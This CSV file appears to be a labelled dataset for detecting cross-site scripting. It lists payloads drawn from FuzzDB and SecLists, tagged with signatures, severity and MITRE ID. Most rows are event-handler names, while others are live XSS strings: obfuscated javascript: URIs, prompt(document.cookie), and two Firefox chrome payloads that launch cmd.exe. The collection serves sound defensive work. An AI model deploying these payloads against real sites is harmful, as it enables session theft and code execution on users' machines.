Payload,Signature,AttackType,Severity,MITRE,Label,Description
java%09script:alert(1)   - Horizontal tab (\\t),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
java%0ascript:alert(1)   - LF (\\n),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
java%0dscript:alert(1)   - CR (\\r),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
javascript:alert%28/xss/%29,SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"javascript:alert(""XSS"")",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
javascript:alert('1'),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
javascript:alert('XSS'),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
javascript:alert('document.domain'),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
javascript:alert(1),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
javascript:alert(document.domain),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Hackazon DOM XSS
javascript:confirm('XSS'),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
javascript:prompt('XSS'),SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
location,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"location=""http://html5sec.org"";",COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
"msgbox(""XSS"")",GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
navigator.vibrate(500),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
navigatorurl: code execution,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C['@mozilla.org/file/local;1'].createInstance(I.nsILocalFile);file.initWithPath('C:'+String.fromCharCode(92)+String.fromCharCode(92)+'Windows'+String.fromCharCode(92)+String.fromCharCode(92)+'System32'+String.fromCharCode(92)+String.fromCharCode(92)+'cmd.exe');process=C['@mozilla.org/process/util;1'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"navigatorurl:test"" -chrome ""javascript:C=Components.classes;I=Components.interfaces;file=C[\\'@mozilla.org/file/local;1\\'].createInstance(I.nsILocalFile);file.initWithPath(\\'C:\\'+String.fromCharCode(92)+String.fromCharCode(92)+\\'Windows\\'+String.fromCharCode(92)+String.fromCharCode(92)+\\'System32\\'+String.fromCharCode(92)+String.fromCharCode(92)+\\'cmd.exe\\');process=C[\\'@mozilla.org/process/util;1\\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)",SCRIPT_TAG_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onabort,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onactivate,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onafterprint,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onafterupdate,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onanimationend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onanimationiteration,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onanimationstart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onautocomplete,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onautocompleteerror,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforeactivate,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforecopy,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforecut,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforedeactivate,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforeeditfocus,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforepaste,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforeprint,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforeunload,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbeforeupdate,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbegin,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onblur,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onbounce,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncancel,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncanplay,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncanplaythrough,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncellchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onclick,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onclose,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncompassneedscalibration,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncontextmenu,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncontrolselect,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncopy,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncuechange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oncut,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondataavailable,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondatasetchanged,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondatasetcomplete,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondblclick,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondeactivate,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondevicelight,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondevicemotion,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondeviceorientation,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondeviceproximity,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondrag,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondragdrop,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondragend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondragenter,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondragexit,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondragleave,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondragover,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondragstart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondrop,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ondurationchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onemptied,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onended,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onerror,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"onerror CDATA ""alert(67)""",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
onerrorupdate,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onexit,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onfilterchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onfinish,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onfocus,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onfocusin,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onfocusout,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onformchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onforminput,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ongesturechange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ongestureend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ongesturestart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onhashchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onhelp,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oninput,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
oninvalid,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onkeydown,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onkeypress,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onkeyup,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onlanguagechange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onlayoutcomplete,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onload,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
"onload CDATA ""alert(2)"">",EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from SecLists
onloadeddata,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onloadedmetadata,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onloadstart,EVENT_HANDLER_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onlosecapture,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmediacomplete,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmediaerror,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmessage,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmousedown,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmouseenter,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmouseleave,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmousemove,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmouseout,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmouseover,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmouseup,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmousewheel,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmove,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmoveend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmovestart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmozfullscreenchange,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmozfullscreenerror,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmozpointerlockchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmozpointerlockerror,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmsgesturechange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmsgesturedoubletap,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmsgesturehold,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmsgesturerestart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmsinertiastart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointercancel,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointerdown,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointerenter,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointerhover,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointerleave,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointermove,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointerout,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointerover,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onmspointerup,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onoffline,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ononline,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onorientationchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onoutofsync,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onpagehide,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onpageshow,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onpaste,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onpause,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onplay,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onplaying,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onpopstate,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onprogress,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onpropertychange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onratechange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onreadystatechange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onreceived,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onrepeat,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onreset,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onresize,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onresizeend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onresizestart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onresume,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onreverse,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onrowdelete,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onrowenter,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onrowexit,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onrowinserted,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onrowsdelete,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onrowsinserted,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onscroll,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onsearch,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onseek,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onseeked,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onseeking,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onselect,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onselectionchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onselectstart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onshow,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onstalled,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onstart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onstop,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onstorage,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onsubmit,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onsuspend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onsynchrestored,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontimeerror,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontimeupdate,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontoggle,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontouchcancel,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontouchend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontouchmove,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontouchstart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontrackchange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
ontransitionend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onunload,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onurlflip,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onuserproximity,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onvolumechange,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwaiting,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitanimationend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitanimationiteration,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitanimationstart,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitmouseforcechanged,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitmouseforcedown,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitmouseforceup,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitmouseforcewillbegin,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkittransitionend,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwebkitwillrevealbottom,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onwheel,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
onzoom,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
pop();astNode.type='UnaryExpression';,COMMAND_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
prompt(1),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
prompt(document.cookie),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
prompt(document.cookie)),GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting attack attempt
rentNode;x.appendChild(i);,GENERIC_INJECTION,Cross-Site Scripting,Medium,T1190,Malicious,Cross-Site Scripting payload from FuzzDB
